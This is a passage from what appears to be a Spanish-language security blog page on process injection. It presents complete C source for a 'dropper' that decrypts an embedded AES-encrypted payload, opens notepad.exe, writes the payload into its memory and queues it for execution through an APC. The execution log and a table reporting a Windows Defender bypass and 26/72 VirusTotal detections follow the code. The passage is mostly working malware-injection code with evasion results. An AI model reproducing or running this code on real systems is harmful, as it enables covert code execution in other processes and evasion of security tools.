<span class="c1">// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html</span>
<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SECTION_INHERIT</span> <span class="p">{</span>
	<span class="n">ViewShare</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
	<span class="n">ViewUnmap</span> <span class="o">=</span> <span class="mi">2</span>
<span class="p">}</span> <span class="n">SECTION_INHERIT</span><span class="p">,</span> <span class="o">*</span><span class="n">PSECTION_INHERIT</span><span class="p">;</span>	



<span class="kt">int</span> <span class="nf">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
	<span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
	<span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
	<span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
	
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>



<span class="n">HANDLE</span> <span class="nf">FindThread</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">){</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[FindThread] for pid %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">THREADENTRY32</span> <span class="n">thEntry</span><span class="p">;</span>
	<span class="n">thEntry</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">thEntry</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">Snap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="n">Snap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">thEntry</span><span class="p">))</span> <span class="p">{</span>
		<span class="c1">//printf("[FindThread] : %d \n", thEntry.th32OwnerProcessID);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">thEntry</span><span class="p">.</span><span class="n">th32OwnerProcessID</span> <span class="o">==</span> <span class="n">pid</span><span class="p">)</span> 	<span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[FindThread] : Thread found %d :"</span><span class="p">,</span> <span class="n">thEntry</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">" ProcessId %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">thEntry</span><span class="p">.</span><span class="n">th32OwnerProcessID</span><span class="p">);</span>
			<span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">thEntry</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">Snap</span><span class="p">);</span>
	
	<span class="k">return</span> <span class="n">hThread</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">FindProcess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//se crear un snapshot de los procesos en ejecución del sistema operativo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// se obtiene el tamaño total del objeo definido     </span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// validación del snapshot creado</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// iteración del snapshot</span>
				<span class="c1">//printf("[FindProcess: ] %s \n", pe32.szExeFile);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// comprobación del nombre del proceso</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span> <span class="c1">// obtención del pid del proceso</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">"[FindProcess]: Process Found %s :"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">" PID %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>       
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span> <span class="c1">//se cierra el snapshot       </span>
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// retorno de pid</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">Inject</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">CONTEXT</span> <span class="n">ctx</span><span class="p">;</span>
	<span class="n">hThread</span> <span class="o">=</span> <span class="n">FindThread</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Error, hijack unsuccessful.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject] External thread handle %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hThread</span><span class="p">);</span>
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject] pRemoteCode %p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">pRemoteCode</span><span class="p">);</span>
	<span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">pRemoteCode</span><span class="p">,</span> <span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject] Asynchronous Process Call wait for execution ... </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>



<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Main] Init Dropper </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindProcess</span><span class="p">(</span><span class="s">"notepad.exe"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[Main] notepad.exe PID = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[Main].AesDecrypt %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">hProc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Main] End Dropper </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Salida de la ejecución del proceso:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Main] Init Dropper
[FindProcess]: Process Found notepad.exe : PID 6044
[Main] notepad.exe PID = 6044
[Main].AesDecrypt ⁿHâΣ≡Φ└
[FindThread] for pid 6044
[FindThread] : Thread found 6064 : ProcessId 6044
[Inject] External thread handle 212
[Inject] pRemoteCode 0000017CFD840000
[Inject] Asynchronous Process Call wait for execution ...
[Main] End Dropper
</code></pre></div></div>

<p>Evidencia de la ejecución:</p>

<p><img src="/assets/images/exe_APC.png" alt="EXE APC " /></p>

<h2 id="detecciones">Detecciones</h2>

<table>
  <thead>
    <tr>
      <th>Code Type</th>
      <th>Windows Defender Bypass</th>
      <th>AV Bypass</th>
      <th>EDR Bypass</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>EXE inyeccion en el proceso externo apc</td>
      <td>True</td>
      <td>26/72 VT detections</td>
      <td>False</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/images/shared_memory_detection.png" alt="Thread Context Dcll detections" /></p>

<p><a href="./injection_types.html">back</a></p>

      </section>
    </div>
  </body>
</html>
